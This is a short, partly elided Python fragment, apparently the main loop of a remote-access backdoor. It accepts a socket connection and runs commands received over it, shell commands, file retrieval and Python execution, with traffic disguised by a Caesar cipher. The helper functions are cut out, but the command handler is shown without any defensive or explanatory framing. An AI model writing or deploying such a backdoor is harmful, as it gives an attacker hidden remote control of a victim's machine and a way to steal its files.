...
if "__main__" == __name__:
    ...
    c,ip = t.accept()
    while True:
        cmd = Caesar(1,c.recv(2048).decode()).split(" ",1)
        if cmd[0] == "shell":
            c.send(Caesar(0,Shell(cmd[1])).encode())
        elif cmd[0] == "get":
            c.send(Caesar(0,Get(cmd[1])).encode())
        elif cmd[0] == "win":
            c.send(Caesar(0,Win()).encode())
        elif cmd[0] == "py":
            c.send(Caesar(0,Py(cmd[1])).encode())
    c.close()
    t.close()
